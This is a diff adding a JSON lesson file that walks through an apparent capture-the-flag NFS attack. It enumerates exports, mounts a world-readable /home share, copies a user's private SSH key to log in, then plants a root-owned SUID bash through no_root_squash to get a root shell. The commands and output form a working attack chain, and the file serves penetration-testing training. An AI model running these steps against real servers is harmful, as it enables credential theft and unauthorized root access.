@@ -1,0 +1,135 @@
+[
+  {
+    "type": "section_heading",
+    "id": "nfs-intro",
+    "text": "NFS (Network File System) Exploitation & Privilege Escalation"
+  },
+  {
+    "type": "order_block",
+    "id": "nfs-definition",
+    "text": "NFS is a protocol used to share files over a network. Misconfigurations like <highlight>no_root_squash</highlight> allow low-privileged users to gain <highlight>root</highlight> access by manipulating file ownership."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "nfs-enumeration",
+    "text": "Phase 1: Service Enumeration"
+  },
+  {
+    "type": "code_block",
+    "id": "nmap-nfs-scan",
+    "language": "bash",
+    "code": "nmap -p 2049 -sV <TARGET_IP>\n/usr/sbin/showmount -e <TARGET_IP>"
+  },
+  {
+    "type": "output_block",
+    "id": "showmount-output",
+    "language": "text",
+    "code": "Export list for <TARGET_IP>:\n/home *"
+  },
+  {
+    "type": "order_block",
+    "id": "enum-analysis",
+    "text": "Nmap confirms port 2049 is open. The showmount command reveals the /home directory is exported to everyone (*)."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "nfs-mounting",
+    "text": "Phase 2: Mounting the Remote Share"
+  },
+  {
+    "type": "code_block",
+    "id": "mount-commands",
+    "language": "bash",
+    "code": "mkdir /tmp/nfs_mount\nsudo mount -t nfs <TARGET_IP>:/home /tmp/nfs_mount -nolock"
+  },
+  {
+    "type": "order_block",
+    "id": "mount-analysis",
+    "text": "The remote /home directory is mounted locally to /tmp/nfs_mount using the -nolock flag to bypass locking issues."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "nfs-initial-access",
+    "text": "Phase 3: Gaining Initial Access (SSH Key Harvesting)"
+  },
+  {
+    "type": "code_block",
+    "id": "ssh-key-harvest",
+    "language": "bash",
+    "code": "ls -la /tmp/nfs_mount/cappucino/.ssh\ncp /tmp/nfs_mount/cappucino/.ssh/id_rsa .\nchmod 600 id_rsa\nssh -i id_rsa cappucino@<TARGET_IP>"
+  },
+  {
+    "type": "order_block",
+    "id": "ssh-access-analysis",
+    "text": "A private SSH key was found in the mounted share, providing a low-privileged shell as user cappucino."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "nfs-privesc-config",
+    "text": "Phase 4: Privilege Escalation (no_root_squash)"
+  },
+  {
+    "type": "order_block",
+    "id": "privesc-theory",
+    "text": "The 'no_root_squash' option tells the server to trust the client's root user, allowing the creation of root-owned SUID binaries."
+  },
+  {
+    "type": "code_block",
+    "id": "suid-payload-creation",
+    "language": "bash",
+    "code": "sudo cp /bin/bash /tmp/nfs_mount/bash\nsudo chown root:root /tmp/nfs_mount/bash\nsudo chmod +s /tmp/nfs_mount/bash"
+  },
+  {
+    "type": "order_block",
+    "id": "payload-analysis",
+    "text": "A bash binary was copied to the mount, assigned root ownership, and given the SUID bit (+s) on the attacker machine."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "root-execution",
+    "text": "Executing the Root Shell"
+  },
+  {
+    "type": "code_block",
+    "id": "run-suid-bash",
+    "language": "bash",
+    "code": "./bash -p"
+  },
+  {
+    "type": "output_block",
+    "id": "whoami-root-output",
+    "language": "bash",
+    "code": "# whoami\nroot"
+  },
+  {
+    "type": "order_block",
+    "id": "exploit-final-analysis",
+    "text": "The SUID bash binary executes with root privileges on the target server, granting full administrative access."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "nfs-summary",
+    "text": "Summary of NFS Attack Path"
+  },
+  {
+    "type": "explanation",
+    "id": "nfs-steps",
+    "title": "Steps Performed",
+    "items": [
+      "Scanned port 2049 to identify the NFS service",
+      "Listed exports using showmount to find accessible directories",
+      "Mounted the /home share to the local attacker machine",
+      "Harvested id_rsa keys to gain initial SSH access",
+      "Verified 'no_root_squash' by checking file ownership capabilities",
+      "Uploaded a bash binary and set the SUID bit as root",
+      "Executed the binary on the target with the -p flag",
+      "Obtained a root shell and captured the final flag"
+    ]
+  }
+]
